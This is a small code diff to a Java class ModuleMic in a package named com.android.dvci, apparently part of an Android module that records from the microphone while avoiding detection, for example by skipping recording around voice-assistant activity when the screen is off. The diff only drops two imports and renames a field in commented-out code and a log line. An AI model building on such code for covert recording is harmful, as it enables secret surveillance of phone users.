@@ -29,13 +29,11 @@ import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
 import com.android.dvci.interfaces.IProcessObserver;
 import com.android.dvci.interfaces.Observer;
-import com.android.dvci.listener.Listener;
 import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.listener.ListenerStandby;
 import com.android.dvci.listener.LowEventAudioManager;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.module.message.LowEventAudio;
-import com.android.dvci.module.message.LowEventSms;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
@@ -676,7 +674,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 				}
 
 			/*
-				if (b.audio_data.className.contains(Status.OK_GOOGLE_ACTIVITY)) {
+				if (b.power_data.className.contains(Status.OK_GOOGLE_ACTIVITY)) {
 					if (pm != null && !pm.isScreenOn()) {
 						Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
 						return false;
@@ -704,7 +702,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 			}
 		}else{
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification):b.audio_data null");//$NON-NLS-1$
+				Check.log(TAG + " (notification):b.power_data null");//$NON-NLS-1$
 			}
 		}
 		return 0;
